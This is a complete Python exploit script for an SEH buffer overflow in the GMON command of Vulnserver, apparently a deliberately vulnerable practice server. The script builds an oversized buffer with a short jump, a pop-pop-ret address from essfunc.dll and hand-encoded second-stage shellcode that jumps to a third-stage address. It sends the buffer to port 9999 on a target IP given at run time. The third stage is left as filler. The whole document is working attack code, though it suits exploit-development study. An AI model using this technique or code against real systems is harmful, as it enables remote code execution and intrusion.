#########################################################################################
# Title: Vulnserver GMON command SEH exploit
# Author: Marco Lugo
# Description: execute second stage -> use the 28 byte space to jump to 3rd stage payload.
#	       3rd stage payload will begin at 0x00B8F238
#
#              To get Stephen Bradshaw's Vulnserver, visit:
#              http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

import socket
import sys
import os
import struct

pop_pop_ret = struct.pack('<I', 0x625010B4) #essfunc.dll
first_stage = '\xEB\x06\x41\x41' # jump forward, hop over the island
#00B8FFE6   2D 42425942      SUB EAX,42594242
#00B8FFEB   2D 42597842      SUB EAX,42785942
#00B8FFF0   2D 4472757A      SUB EAX,7A757244
#00B8FFF5   FFE0             JMP EAX
second_stage = ('\x2D\x42\x42\x59\x42' #SUB EAX,42594242 (EAX was already zero)
		'\x2D\x42\x59\x78\x42' #SUB EAX,42785942
		'\x2D\x44\x72\x75\x7A' #SUB EAX,7A757244
		'\xFF\xE0') #JMP EAX -> JMP to 0x00B8F238

target_ip = sys.argv[1]
buffer = 'GMON /.:/'
buffer += '\x41'*1999 + '\x42'*1496 + first_stage + pop_pop_ret
buffer += second_stage + '\x43'*(1697-len(second_stage))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()


